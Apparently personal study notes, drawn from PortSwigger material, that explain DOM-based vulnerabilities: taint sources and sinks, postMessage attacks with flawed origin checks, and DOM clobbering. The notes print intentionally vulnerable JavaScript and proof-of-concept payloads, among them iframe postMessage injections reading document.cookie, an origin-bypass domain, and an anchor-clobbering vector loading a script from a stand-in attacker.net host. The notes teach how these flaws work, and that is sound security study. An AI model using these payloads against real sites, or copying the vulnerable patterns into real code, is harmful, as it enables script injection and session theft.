# Dom Based Vulnearbility

## DOM (Document Object Model)

- The Document Object Model is a web browser's hierarchical representation of the elements on the page.
- Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks.
- DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

# Taint-Flow Vulnerabilities

## Taint Flow

- **Source:** Source is JavaScript property that accepts data that is potentially attacker-controlled. `Example :` `location.search` property, it reads input from the query string which is relatively simpler for an attacker control.
- **Sink:** it is potentially dangerous JavaScript or `DOM` object that can cause undesirable effects. `Example:` `eval()` function is sink , because it processes the argument that is passed to it as JavaScript,
- Vulnerability arise when website passes data from `Source` to `Sink` which than handle the data in an unsafe way in the context of client session.
- Most common source is `URL` which typically accessed with `location` object.
- attacker can construct link to send a victim to a vulnerable page with a payload in the query string and fragment portion of URL
`Example Dom Based open Redirect vuln`

```
goto = location.hash.slice(1)
if(goto.startsWith('https:')){
location = goto;}

```

this could be exploited by

```
<https://www.vuln-web.com/example#https://attacker.com>

```

when victim visit this URL, JS sets the value of the `location` property to `https://attacker.com`

## Common Source

- following sources that can be used to exploit variety of taint-flow vulnerability
    1. `document.URL`
    2. `document.documentURI`
    3. `document.URLUencoded`
    4. `document.baseURI`
    5. `location`
    6. `document.cookie`
    7. `document.referrer`
    8. `window.name`
    9. `history.pushState`
    10. `history.replaceState`
    11. `localStorage`
    12. `sessionStorage`
    13. `IndexeDB (mozIndexeDB, webkitIndexeDB, msIndexeDB)`
    14. `Database`

the following kind of data can also be used as `source` to exploit `taint-flow culnerability`

- [reflected data(reflected DOM xss)](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)
- [Stored data (stored DOM XSS)](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)
- [Web messages as source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)

## web messages as source

### Controlling web-message Source

### How to construct an attack using web messages as the source

vuln code

```
<script>
window.addEventListener('message', function(e){
eval(e.data);
});
</script>

```

this Script is vulnerable because an attacker could inject a JS payload by constructing `iframe:`

```
<iframe src = "//vuln-web.com"
onload = "this.contentWindow.postMessage('alert(1)','*')">

```

because the event listener does not verify Origin of the message, event listener accepts the payload and passes it into a sink, in this case it is `eval()` function.

example exploits

```
#exploit-server code
<iframe src="<https://vuln-web.com/>" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">

```

### Origin Verification

- if some `event listener` does include some form of origin verification, this verification step can sometimes be flawed

```
window.addEventListener('message', function(e){
if(e.origin.indexOf('normal-web.com')> -1){
eval(e.data)}})

```

- The `indexOf` method is used to try and verify that the origin of the incoming message is the `normal-website.com` domain. However, in practice, it only checks whether the string `"normal-website.com"` is contained anywhere in the origin URL.
- this can be bypass by `http://www.normal-web.com.attacker.net`
- the same flaw also applied to verification checks relay on `startsWith() or endsWith()` methods.
- `example:` `http://www.malicious-websitenormal-website.com` as safe acc. to the verifyier methods

```
window.addEventListener('message', function(e){
if(e.origin.endsWith('normal-website.com')){
eval(e.data)}})

```

exploit

```
<iframe src=https://vuln-web.com/ onload='this.contentWindow.postMessage("{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:alert(document.cookie)\\"}","*")'>

```

# Sinks lead to DOM-based vulnerability

### [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

- example sink `document.write()`

### [Open redirect Dom-based](https://portswigger.net/web-security/dom-based/open-redirection)

- example sink `window.location`

### [cookie manipulation dom-based](https://portswigger.net/web-security/dom-based/cookie-manipulation)

- example sink `document.cookie`

### [javaScript injection dom-based](https://portswigger.net/web-security/dom-based/javascript-injection)

- example sink `eval()`

### [Document-domain manipulation dom based](https://portswigger.net/web-security/dom-based/document-domain-manipulation)

### [webSocket-Url poisoning dom](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)

### [Link manipulation dom](https://portswigger.net/web-security/dom-based/link-manipulation)

### [Web message manipulation dom](https://portswigger.net/web-security/dom-based/web-message-manipulation)

### [Ajax request header manipulation dom](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)

### [local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)

### [client-SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)

### [HTML5 Storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)

### [Client XPATH injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)

### [client Side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)

### [data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)

### [Denial of service DOS dom-based](https://portswigger.net/web-security/dom-based/denial-of-service)

# DOM Clobbering

- this is advanced technique in which `HTML` is injected into a web page to manipulate `DOM` and change the behavior of `JavaScript` on the website.
- most common form of DOM clobbering use `anchor element` to overwrite a global variable, which is then used by the application to inject script URL
- `example:`
DOM clobbering is particularly useful in cases where `XSS` is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

## Exploitation of DOM Clobbering vulnerability

- vulnerable code that is commonly used by JS developer

```
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>

```

exploit: inject HTML to clobber `someObject` reference with `anchor element`

```
<a id=someObject><a id=someObject name=url href=//attacker.net/exploit.js>

```

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.

- Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties.
- `example:`
clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out
`<form onclick=alert(1)><input id=attributes>Click me`
In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element. Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead. As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead. This results in the `onclick` event being ignored altogether by the filter, which subsequently allows the `alert()` function to be called in the browser.

## [Prevention DOM-CLobbering attack](https://portswigger.net/web-security/dom-based/dom-clobbering)